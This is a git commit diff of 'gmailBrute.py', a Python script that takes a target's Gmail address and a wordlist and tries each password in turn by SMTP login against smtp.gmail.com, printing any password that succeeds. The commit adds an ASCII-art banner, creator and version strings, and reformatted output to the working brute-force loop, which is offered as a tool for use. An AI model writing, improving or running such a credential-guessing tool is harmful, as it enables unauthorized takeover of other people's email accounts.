71576c5ba2c85d1055c76549bb39849935533ef4
Declan <62638427+DevDeclann@users.noreply.github.com>
2021-02-28 21:20:09 +1300

    Update gmailBrute.py

--- gmailBrute.py
+++ gmailBrute.py
@@ -1,8 +1,25 @@
 import smtplib
+from os import system
+
 
 smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
 smtpserver.ehlo()
 smtpserver.starttls()
+
+def banner():
+	print("                        __ __ __                __  	       \n")
+	print(" .-----.--------.---.-.|__|  |  |--.----.--.--.|  |_.-----. \n")
+	print(" |  _  |        |  _  ||  |  |  _  |   _|  |  ||   _|  -__| \n")
+	print(" |___  |__|__|__|___._||__|__|_____|__| |_____||____|_____| \n")
+	print(" |_____|                                                    \n")
+banner()
+
+
+
+creator = "					creator: DevDeclann (2/27/2021)	"
+version = "					      gmailBrute: v.1.0		"
+print(creator)
+print(version)
 
 user = input("Enter targets email address: ")
 passwordf = input("Enter Dictionary File: ")
@@ -15,9 +32,9 @@ for password in file:
 
     try:
         smtpserver.login(user, password)
-        print("[+] password found!: %s" % password)
+        print("[+] password found!: => %s" % password)
         break
     except smtplib.SMTPAuthenticationError:
-        print("[-] wrong password defined: " + password)
+        print("[-] wrong password defined: => " + password)
 
 input()
